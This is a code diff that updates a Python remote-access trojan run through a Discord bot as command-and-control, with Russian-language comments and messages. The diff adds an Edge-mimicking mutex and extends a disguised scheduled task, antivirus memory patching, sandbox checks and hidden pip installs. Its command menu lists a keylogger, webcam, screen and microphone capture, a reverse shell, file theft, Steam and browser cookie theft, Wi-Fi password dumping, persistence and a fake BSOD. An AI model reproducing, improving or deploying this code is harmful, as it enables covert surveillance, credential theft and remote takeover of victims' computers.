@@ -2,6 +2,7 @@ import asyncio
 import array
 import base64
 import ctypes
+import datetime
 import io
 import json
 import os
@@ -60,6 +61,22 @@ CONTROL_CHANNEL_ID = 1536279256655597580
 RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
 TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
 TASK_DESC = "Microsoft Edge Update Task Machine UA"
+_MUTEX_HANDLE = None
+
+def single_instance_guard():
+    global _MUTEX_HANDLE
+    if sys.platform != "win32": return
+    try:
+        k32 = ctypes.windll.kernel32
+        k32.CreateMutexW.argtypes = [ctypes.c_void_p, ctypes.c_bool, ctypes.c_wchar_p]
+        k32.CreateMutexW.restype = ctypes.c_void_p
+        for name in ("Global\\Microsoft_Edge_UA_Diagnostics_Mutex_v1", "Local\\Microsoft_Edge_UA_Diagnostics_Mutex_v1"):
+            _MUTEX_HANDLE = k32.CreateMutexW(None, True, name)
+            if _MUTEX_HANDLE:
+                if k32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+                    os._exit(0)
+                break
+    except Exception: pass
 
 def check_environment() -> bool:
     if os.cpu_count() and os.cpu_count() < 2: return False
@@ -111,6 +128,59 @@ def bypass_av_memory():
                     ctypes.memmove(_fe, _p, len(_p))
                     getattr(_k32, _vp)(_fe, len(_p), _op.value, ctypes.byref(_op))
     except Exception: pass
+
+def disable_audio_ducking():
+    if sys.platform != "win32": return
+    try:
+        # UserDuckingPreference = 3: Do nothing (не приглушать звук других программ)
+        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Multimedia\Audio")
+        winreg.SetValueEx(k, "UserDuckingPreference", 0, winreg.REG_DWORD, 3)
+        winreg.CloseKey(k)
+    except Exception: pass
+
+def force_unmute_self():
+    if sys.platform != "win32": return
+    try:
+        comtypes.CoInitialize()
+        my_pid = os.getpid()
+        sessions = AudioUtilities.GetAllSessions()
+        for s in sessions:
+            if s.ProcessId == my_pid or (s.Process and s.Process.name().lower() in ("pythonw.exe", "python.exe")):
+                vol = s._ctl.QueryInterface(ISimpleAudioVolume)
+                if vol.GetMute():
+                    vol.SetMute(0, None)
+                if vol.GetMasterVolume() < 0.99:
+                    vol.SetMasterVolume(1.0, None)
+    except Exception: pass
+    finally:
+        try: comtypes.CoUninitialize()
+        except Exception: pass
+
+def keep_self_unmuted():
+    if sys.platform != "win32": return
+    while True:
+        force_unmute_self()
+        time.sleep(1)
+
+def get_set_volume(level: int = -1) -> int:
+    if sys.platform != "win32": return -1
+    try:
+        comtypes.CoInitialize()
+        from pycaw.pycaw import IAudioEndpointVolume
+        from ctypes import cast, POINTER
+        from comtypes import CLSCTX_ALL
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        vol = cast(interface, POINTER(IAudioEndpointVolume))
+        if level >= 0:
+            vol.SetMute(0, None)
+            vol.SetMasterVolumeLevelScalar(max(0.0, min(1.0, level / 100.0)), None)
+        return int(round(vol.GetMasterVolumeLevelScalar() * 100))
+    except Exception:
+        return -1
+    finally:
+        try: comtypes.CoUninitialize()
+        except Exception: pass
 
 def install_stealth_task():
     try:
@@ -176,13 +246,15 @@ def uninstall_stealth_task():
 
 def play_sound_mci(url: str):
     def _worker():
+        force_unmute_self()
+        alias = f"c2_track_{int(time.time() * 1000) % 100000}"
+        path = None
         try:
             r = requests.get(url, timeout=15)
             ext = ".mp3" if ".mp3" in url.lower() else ".wav"
             with tempfile.NamedTemporaryFile(delete=False, suffix=ext) as f:
                 f.write(r.content)
                 path = f.name
-            alias = f"c2_track_{int(time.time() * 1000) % 100000}"
             winmm = ctypes.windll.winmm
             winmm.mciSendStringW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint, ctypes.c_void_p]
             winmm.mciSendStringW.restype = ctypes.c_ulong
@@ -190,10 +262,17 @@ def play_sound_mci(url: str):
             cmd_open = f'open "{path}" type mpegvideo alias {alias}'
             if winmm.mciSendStringW(cmd_open, None, 0, None) == 0:
                 winmm.mciSendStringW(f"play {alias} wait", None, 0, None)
+                winmm.mciSendStringW(f"stop {alias}", None, 0, None)
                 winmm.mciSendStringW(f"close {alias}", None, 0, None)
-            try: os.remove(path)
-            except Exception: pass
         except Exception: pass
+        finally:
+            try:
+                ctypes.windll.winmm.mciSendStringW(f"close {alias}", None, 0, None)
+                ctypes.windll.winmm.mciSendStringW("close all", None, 0, None)
+            except Exception: pass
+            if path and os.path.exists(path):
+                try: os.remove(path)
+                except Exception: pass
     threading.Thread(target=_worker, daemon=True).start()
 
 
@@ -260,18 +339,23 @@ def get_active_window() -> str:
 
 def record_mic_wav(seconds: int) -> io.BytesIO:
     pa = pyaudio.PyAudio()
+    stream = None
+    frames = []
     try:
         stream = pa.open(format=pyaudio.paInt16, channels=1, rate=16000, input=True, frames_per_buffer=1024)
+        total_chunks = int(16000 / 1024 * seconds)
+        for _ in range(max(1, total_chunks)):
+            frames.append(stream.read(1024, exception_on_overflow=False))
     except Exception as e:
-        pa.terminate()
         raise RuntimeError(f"Не удалось открыть микрофон: {e}")
-    frames = []
-    total_chunks = int(16000 / 1024 * seconds)
-    for _ in range(max(1, total_chunks)):
-        frames.append(stream.read(1024, exception_on_overflow=False))
-    stream.stop_stream()
-    stream.close()
-    pa.terminate()
+    finally:
+        if stream:
+            try:
+                stream.stop_stream()
+                stream.close()
+            except Exception: pass
+        try: pa.terminate()
+        except Exception: pass
     buf = io.BytesIO()
     with wave.open(buf, "wb") as wf:
         wf.setnchannels(1)
@@ -404,53 +488,121 @@ async def on_ready():
     if ch:
         user = os.environ.get("USERNAME", "User")
         domain = os.environ.get("USERDOMAIN", "PC")
-        msg = (
-            f"[C2 СЕССИЯ АКТИВНА В ОЗУ]\n"
-            f"Узел: `{domain}\\{user}`\n"
-            f"Активное окно: `{get_active_window()}`\n"
-            f"Планировщик: задача `{TASK_NAME}` активна (скрыта).\n"
-            f"Для справки: `!menu`"
+        embed = _dc.Embed(
+            title="🟢 C2 Сессия подключена",
+            description="Агент активен и находится в оперативной памяти.",
+            color=0x2ecc71,
+            timestamp=datetime.datetime.now(datetime.timezone.utc)
         )
-        await ch.send(msg)
+        embed.add_field(name="👤 Узел", value=f"`{domain}\\{user}`", inline=True)
+        embed.add_field(name="🪟 Окно", value=f"`{get_active_window()}`", inline=True)
+        latency = round(bot.latency * 1000) if bot.latency else 0
+        embed.add_field(name="📶 Пинг", value=f"`{latency} ms`", inline=True)
+        embed.add_field(name="⚙️ Планировщик", value=f"`{TASK_NAME}` (скрыт)", inline=True)
+        embed.add_field(name="🛡️ Защита", value="`Single-Instance • Auto-Unmute`", inline=True)
+        embed.add_field(name="📖 Команды", value="Отправьте `!menu`", inline=True)
+        embed.set_footer(text=f"PID: {os.getpid()} • Python {sys.version.split()[0]}")
+        try:
+            await ch.send(embed=embed)
+        except Exception:
+            await ch.send(f"[C2 СЕССИЯ АКТИВНА В ОЗУ]\nУзел: `{domain}\\{user}`\nАктивное окно: `{get_active_window()}`\nДля справки: `!menu`")
 
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, _dc_ext.MissingRequiredArgument):
-        await ctx.send(f"Ошибка: пропущен аргумент `{error.param.name}`.")
+        await ctx.send(f"⚠️ Ошибка: пропущен аргумент `{error.param.name}`.")
     elif isinstance(error, _dc_ext.CommandNotFound):
         pass
     elif isinstance(error, _dc.HTTPException) and error.status == 429:
         await asyncio.sleep(5)
     else:
-        await ctx.send(f"Ошибка выполнения: `{error}`")
+        await ctx.send(f"⚠️ Ошибка выполнения: `{error}`")
 
 @bot.command()
 async def menu(ctx):
-    help_text = (
-        "**[СКРИН/СИСТЕМА]**\n"
-        "`!screen` — скрин | `!screen_loop [сек]` — авто (0=стоп) | `!window` — окно | `!sysinfo` — инфо о системе\n\n"
-        "**[УПРАВЛЕНИЕ]**\n"
-        "`!cmd <cmd>` — консоль | `!sh <cmd>` — интерактивный shell\n"
-        "`!shell_start` / `!shell_stop` — reverse shell | `!kill <proc>` — убить процесс\n\n"
-        "**[ФАЙЛЫ]**\n"
-        "`!ls [path]` — список | `!dl <path>` — скачать | `!ul` — загрузить | `!rm <path>` — удалить\n\n"
-        "**[КЛАВИШИ/МЫШЬ]**\n"
-        "`!kl_start` / `!kl_stop` / `!kl_dump` — кейлоггер\n"
-        "`!swap <k1> <k2>` / `!unswap` | `!mouse move|offset|wheel|swap|restore`\n\n"
-        "**[МЕДИА]**\n"
-        "`!cam [n]` — фото с камеры | `!cam_list` — список камер\n"
-        "`!rec [sec]` — запись мик | `!listen` / `!unlisten` — стрим | `!sound <url>` — звук\n"
-        "`!tts <text>` — озвучка | `!mute <proc>` / `!unmute`\n\n"
-        "**[БУФЕР/UI]**\n"
-        "`!clip_get` / `!clip_set` | `!url <link>` | `!ad <T>|<Text>|<URL>|<Img>` | `!banner <C>|<T>`\n\n"
-        "**[РАЗВЕДКА]**\n"
-        "`!steam` — дамп Steam/Cookies | `!wifi` — Wifi пароли\n\n"
-        "**[ПЕРСИСТЕНТНОСТЬ]**\n"
-        "`!persist_reg` — добавить в HKCU\\Run | `!persist_remove` — убрать\n\n"
-        "**[УПРАВЛЕНИЕ БОТОМ]**\n"
-        "`!bsod [sec]` — BSOD | `!off` — выкл | `!stop` — стоп | `!uninstall` — удалить"
+    embed = _dc.Embed(
+        title="🛰️ C2 Remote Console — Панель управления",
+        description="Префикс: `!` • Все модули агента доступны для управления",
+        color=0x2b2d31
     )
-    await safe_send(ctx, help_text)
+    embed.add_field(
+        name="🖥️ Экран и наблюдение",
+        value=(
+            "`!screen` — Скриншот всех мониторов\n"
+            "`!screen_loop [сек]` — Автоскриншоты (0 = выкл)\n"
+            "`!cam [кадры]` — Фото с камеры | `!cam_list` — Список камер\n"
+            "`!window` — Заголовок активного окна"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="⚡ Командная строка и система",
+        value=(
+            "`!cmd <команда>` — Быстрый запуск в фоне\n"
+            "`!sh <команда>` — Интерактивная командная строка\n"
+            "`!shell_start` / `!shell_stop` — Полноценный reverse shell\n"
+            "`!sysinfo` — Сводка железа/дисков/ОЗУ | `!top` — Топ процессов | `!ping` — Задержка"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="📁 Файловый менеджер",
+        value=(
+            "`!ls [путь]` — Список файлов\n"
+            "`!dl <путь>` — Скачать файл с удаленной машины\n"
+            "`!ul` — Загрузить файл на машину (прикрепи файл к `!ul`)\n"
+            "`!rm <путь>` — Удалить файл"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="🎙️ Аудио и мультимедиа",
+        value=(
+            "`!listen` / `!unlisten` — Прямой стрим микрофона в голосовой канал\n"
+            "`!rec [сек]` — Запись микрофона в .wav (до 120 сек)\n"
+            "`!sound <url>` — Воспроизвести аудиофайл\n"
+            "`!tts <текст>` — Голосовая озвучка через динамики\n"
+            "`!vol [0-100]` — Громкость системы | `!mute <proc>` / `!unmute`"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="⌨️ Ввод и буфер обмена",
+        value=(
+            "`!kl_start` / `!kl_stop` / `!kl_dump` — Кейлоггер клавиш\n"
+            "`!swap <k1> <k2>` / `!unswap` — Подмена клавиш клавиатуры\n"
+            "`!mouse move|offset|wheel|swap|restore` — Управление курсором\n"
+            "`!clip_get` / `!clip_set <текст>` — Чтение и запись буфера"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="🕵️ Разведка и взаимодействие",
+        value=(
+            "`!steam` — Сбор Steam VDF и cookie-сессий браузера\n"
+            "`!wifi` — Пароли всех сохраненных сетей Wi-Fi\n"
+            "`!ad <Заголовок>|<Текст>|[URL]` — Всплывающий Windows Toast\n"
+            "`!banner <Заголовок>|<Текст>` — Экранный баннер блокировки\n"
+            "`!url <ссылка>` — Открыть URL в браузере по умолчанию"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="🛡️ Управление агентом",
+        value=(
+            "`!kill <процесс>` — Завершить процесс по имени\n"
+            "`!persist_reg` / `!persist_remove` — Реестр автозапуска HKCU\n"
+            "`!bsod [сек]` — Экран критического сбоя\n"
+            "`!off` — Выключение ПК | `!stop` — Остановка | `!uninstall` — Полное удаление"
+        ),
+        inline=False
+    )
+    latency = round(bot.latency * 1000) if bot.latency else 0
+    embed.set_footer(text=f"Узел: {os.environ.get('COMPUTERNAME', 'PC')} • Задержка: {latency} ms • Режим ОЗУ")
+    try:
+        await ctx.send(embed=embed)
+    except Exception:
+        await safe_send(ctx, "Ошибка отправки Embed-меню.")
 
 @bot.command()
 async def screen(ctx):
@@ -510,7 +662,8 @@ async def mute(ctx, proc_name: str):
     try:
         comtypes.CoInitialize()
         sessions = AudioUtilities.GetAllSessions()
-        hit = [s.Process.name() for s in sessions if s.Process and proc_name.lower() in s.Process.name().lower() and not s._ctl.QueryInterface(ISimpleAudioVolume).SetMute(1, None)]
+        my_pid = os.getpid()
+        hit = [s.Process.name() for s in sessions if s.Process and s.ProcessId != my_pid and proc_name.lower() in s.Process.name().lower() and s.Process.name().lower() not in ("pythonw.exe", "python.exe") and not s._ctl.QueryInterface(ISimpleAudioVolume).SetMute(1, None)]
         await ctx.send(f"Мут: `{set(hit)}`" if hit else f"Не найден: `{proc_name}`")
     except Exception as e: await ctx.send(f"Ошибка: {e}")
     finally:
@@ -565,11 +718,44 @@ async def rec(ctx, seconds: int = 5):
         await ctx.send("Микрофон:", file=_dc.File(wav_io, filename="mic.wav"))
     except Exception as e: await ctx.send(f"Ошибка: {e}")
 
+def ensure_voice_deps() -> bool:
+    try:
+        import nacl
+        import davey
+        return True
+    except ImportError:
+        try:
+            exe = sys.executable or "python.exe"
+            _sp_run([exe, "-m", "pip", "install", "-U", "PyNaCl", "davey", "-q"],
+                    capture_output=True, creationflags=0x08000000)
+            import importlib
+            importlib.invalidate_caches()
+            import davey
+            import nacl
+            _vc = sys.modules.get("discord.voice_client")
+            _vs = sys.modules.get("discord.voice_state")
+            _gw = sys.modules.get("discord.gateway")
+            if _vc:
+                _vc.has_dave = True
+                _vc.has_nacl = True
+                _vc.davey = davey
+            if _vs:
+                _vs.has_dave = True
+                _vs.has_nacl = True
+                _vs.davey = davey
+            if _gw:
+                _gw.davey = davey
+            return True
+        except Exception:
+            return False
+
 @bot.command()
 async def listen(ctx):
     if not ctx.author.voice: return await ctx.send("Зайди в голосовой канал.")
     target_channel = ctx.author.voice.channel
     try:
+        if not await asyncio.to_thread(ensure_voice_deps):
+            return await ctx.send("Ошибка: Не удалось загрузить davey / PyNaCl.")
         if ctx.voice_client:
             if ctx.voice_client.channel != target_channel: await ctx.voice_client.move_to(target_channel)
         else: await target_channel.connect()
@@ -596,13 +782,19 @@ async def steam(ctx):
 @bot.command()
 async def tts(ctx, *, text: str):
     def _speak():
+        force_unmute_self()
+        engine = None
         try:
             comtypes.CoInitialize()
             engine = pyttsx3.init()
             engine.say(text)
             engine.runAndWait()
+            engine.stop()
         except: pass
         finally:
+            if engine:
+                try: del engine
+                except: pass
             try: comtypes.CoUninitialize()
             except: pass
     threading.Thread(target=_speak, daemon=True).start()
@@ -951,29 +1143,84 @@ async def shell_stop(ctx):
         _shell_proc = None
     await ctx.send("Shell остановлен.")
 
-# ─── SYSINFO ───────────────────────────────────────────────────────────────────
+# ─── SYSINFO & EXTRA TOOLS ─────────────────────────────────────────────────────
+@bot.command()
+async def ping(ctx):
+    ms = round(bot.latency * 1000) if bot.latency else 0
+    embed = _dc.Embed(description=f"🏓 Понг! Задержка Discord шлюза: **{ms} ms**", color=0x2ecc71)
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def vol(ctx, level: int = -1):
+    try:
+        val = await asyncio.to_thread(get_set_volume, level)
+        if val < 0:
+            return await ctx.send("⚠️ Ошибка: устройство воспроизведения недоступно.")
+        if level >= 0:
+            embed = _dc.Embed(description=f"🔊 Системная громкость установлена на **{val}%**", color=0x2ecc71)
+        else:
+            embed = _dc.Embed(description=f"🔈 Текущая системная громкость: **{val}%**", color=0x5865F2)
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
+
+@bot.command()
+async def top(ctx):
+    try:
+        procs = []
+        for p in psutil.process_iter(['pid', 'name', 'memory_info']):
+            try:
+                mem = p.info['memory_info'].rss / (1024 * 1024)
+                procs.append((p.info['name'] or 'unknown', p.info['pid'], mem))
+            except Exception: pass
+        procs.sort(key=lambda x: x[2], reverse=True)
+        top_list = procs[:8]
+        lines = [f"{'PID':<7} {'Память':<10} {'Имя процесса'}"]
+        lines.append("─" * 38)
+        for name, pid, mem in top_list:
+            lines.append(f"{pid:<7} {mem:>7.1f} МБ  {name}")
+        embed = _dc.Embed(title="📊 Топ процессов по памяти", color=0x5865F2)
+        embed.description = "```asciidoc\n" + "\n".join(lines) + "\n```"
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
+
 @bot.command()
 async def sysinfo(ctx):
     try:
-        cpu = _sp_run(["wmic","cpu","get","Name","/value"],
-            capture_output=True, text=True, encoding="cp866", errors="replace",
-            creationflags=0x08000000).stdout.strip()
-        ram_gb = round(psutil.virtual_memory().total / (1024**3), 1)
+        def pbar(pct, length=10):
+            filled = int(length * max(0, min(100, pct)) / 100)
+            return "█" * filled + "░" * (length - filled)
+
+        cpu = _sp_run(["wmic","cpu","get","Name","/value"], capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000).stdout.strip().replace("Name=", "").strip()
+        os_cap = _sp_run(['wmic','os','get','Caption','/value'], capture_output=True, text=True, encoding='cp866', errors='replace', creationflags=0x08000000).stdout.strip().replace("Caption=", "").strip()
+        vmem = psutil.virtual_memory()
+        ram_gb = round(vmem.total / (1024**3), 1)
+        ram_used = round(vmem.used / (1024**3), 1)
+        ram_pct = int(vmem.percent)
+        
         disk = psutil.disk_usage("/")
-        ip_info = _sp_run(["ipconfig"],
-            capture_output=True, text=True, encoding="cp866", errors="replace",
-            creationflags=0x08000000).stdout
-        lines = [
-            f"**Хост:** `{os.environ.get('COMPUTERNAME','?')}\\{os.environ.get('USERNAME','?')} `",
-            f"**ОС:** `{_sp_run(['wmic','os','get','Caption','/value'], capture_output=True, text=True, encoding='cp866', errors='replace', creationflags=0x08000000).stdout.strip()}`",
-            f"**CPU:** `{cpu}`",
-            f"**RAM:** `{ram_gb} ГБ`",
-            f"**Диск C:** `{round(disk.used/1024**3,1)} / {round(disk.total/1024**3,1)} ГБ`",
-            f"**Аптайм:** `{int(ctypes.WinDLL(bytes(x^0xAA for x in [193,207,216,196,207,198,153,152]).decode()).GetTickCount64()//1000)} с`",
-            f"**IP:**",
-            f"```\n{ip_info[:800]}\n```",
-        ]
-        await ctx.send("\n".join(lines))
+        disk_pct = int(disk.percent)
+        disk_used = round(disk.used / (1024**3), 1)
+        disk_total = round(disk.total / (1024**3), 1)
+
+        _k = 0xAA
+        uptime_sec = int(ctypes.WinDLL(bytes(x^_k for x in [193,207,216,196,207,198,153,152]).decode()).GetTickCount64() // 1000)
+        h, m = divmod(uptime_sec // 60, 60)
+        d, h = divmod(h, 24)
+        uptime_str = f"{d}д {h}ч {m}м" if d else f"{h}ч {m}м"
+
+        embed = _dc.Embed(title="💻 Системная сводка узла", color=0x5865F2)
+        embed.add_field(name="👤 Узел", value=f"`{os.environ.get('COMPUTERNAME','?')}\\{os.environ.get('USERNAME','?')}`", inline=True)
+        embed.add_field(name="🪟 ОС", value=f"`{os_cap or 'Windows'}`", inline=True)
+        embed.add_field(name="⏱️ Аптайм", value=f"`{uptime_str}`", inline=True)
+        embed.add_field(name="🧠 Процессор", value=f"`{cpu or 'N/A'}`", inline=False)
+        embed.add_field(name=f"ОЗУ: {ram_used} / {ram_gb} ГБ ({ram_pct}%)", value=f"`[{pbar(ram_pct)}]`", inline=True)
+        embed.add_field(name=f"Диск C: {disk_used} / {disk_total} ГБ ({disk_pct}%)", value=f"`[{pbar(disk_pct)}]`", inline=True)
+        
+        ip_info = _sp_run(["ipconfig"], capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000).stdout
+        embed.add_field(name="🌐 Сетевые интерфейсы", value=f"```dos\n{ip_info[:700]}\n```", inline=False)
+        await ctx.send(embed=embed)
     except Exception as e:
         await ctx.send(f"Ошибка: {e}")
 
@@ -991,7 +1238,11 @@ def run_resilient():
             time.sleep(5)
 
 if __name__ == "__main__":
+    single_instance_guard()
     if check_environment():
         bypass_av_memory()
+        disable_audio_ducking()
         install_stealth_task()
+        threading.Thread(target=ensure_voice_deps, daemon=True).start()
+        threading.Thread(target=keep_self_unmuted, daemon=True).start()
         run_resilient()
